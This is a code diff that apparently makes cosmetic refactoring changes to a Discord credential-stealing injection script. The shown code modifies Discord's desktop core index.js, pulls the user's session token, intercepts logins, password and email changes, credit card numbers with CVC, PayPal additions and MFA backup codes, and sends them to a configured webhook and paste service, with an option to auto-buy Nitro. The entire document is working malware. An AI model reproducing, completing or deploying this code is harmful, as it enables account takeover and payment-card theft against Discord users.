@@ -94,8 +94,8 @@ function updateCheck() {
     const indexJs = `${parentDir}\\discord_desktop_core-2\\discord_desktop_core\\index.js`
     const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
-    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson, (err) => {});
-    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex, (err) => {});
+    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
+    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
 
     if (process.platform === "win32" || process.platform === "darwin") {
         fs.writeFileSync(packageJson, JSON.stringify({
@@ -135,18 +135,17 @@ if (fs.existsSync(bdPath)) {
     return !1;
 }
 
-const execScript = async(script) => {
+const execScript = (script) => {
     const window = BrowserWindow.getAllWindows()[0];
-    return await window.webContents.executeJavaScript(script, !0)
+    return window.webContents.executeJavaScript(script, !0)
 };
 
 const dpaste = async(content) => {
-    const raw = await execScript(`var xmlHttp = new XMLHttpRequest();
+    return await execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("POST", "${config.bin}", false);
     xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xmlHttp.send('content=${encodeURIComponent(content)}&expiry_days=30');
     xmlHttp.responseText;`)
-    return raw
 };
 
 const getInfo = async(token) => {
@@ -172,8 +171,7 @@ const getMfa = async(password, token) => {
     for (const i in codes) {
         content += `${codes[i].code} ⋮ ${codes[i].consumed ? 'used' : 'not used'}\n`
     }
-    const paste = await dpaste(content);
-    return paste
+    return await dpaste(content);
 };
 
 const fetchBilling = async(token) => {
@@ -199,7 +197,7 @@ const getBilling = async (token) => {
             billing += "✅" + " 💳";
         } else {
             billing = "❌";
-        };
+        }
     });
     if (billing === "") billing = "❌"
     return billing;
@@ -314,11 +312,11 @@ const getBadges = (flags) => {
 };
 
 const hooker = (content) => {
-    execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "${config.webhook}", true);
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(content)}));
+    execScript(`var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${config.webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${JSON.stringify(content)}));
 `)
 };
 
@@ -633,32 +631,32 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
     const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)
     switch (true) {
         case details.url.endsWith('login'):
-            login(data.login, data.password, token)
+            login(data.login, data.password, token)//.catch(console.error)
             break;
 
         case details.url.endsWith('users/@me') && details.method === 'PATCH':
             if (!data.password) return;
             if (data.email) {
-                emailChanged(data.email, data.password, token)
+                emailChanged(data.email, data.password, token)//.catch(console.error)
             };
             if (data.new_password) {
-                passwordChanged(data.password, data.new_password, token)
+                passwordChanged(data.password, data.new_password, token)//.catch(console.error)
             }
             break;
 
         case details.url.endsWith('tokens') && details.method === "POST":
             const item = querystring.parse(unparsedData.toString())
-            ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
+            ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)//.catch(console.error)
             break;
 
         case details.url.endsWith('paypal_accounts') && details.method === "POST":
-            PaypalAdded(token)
+            PaypalAdded(token)//.catch(console.error)
             break;
 
         case details.url.endsWith('confirm') && details.method === "POST":
             if (!config.auto_buy_nitro) return;
             setTimeout(() => {
-                nitroBought(token)
+                nitroBought(token)//.catch(console.error)
             }, 7500);
             break;
 
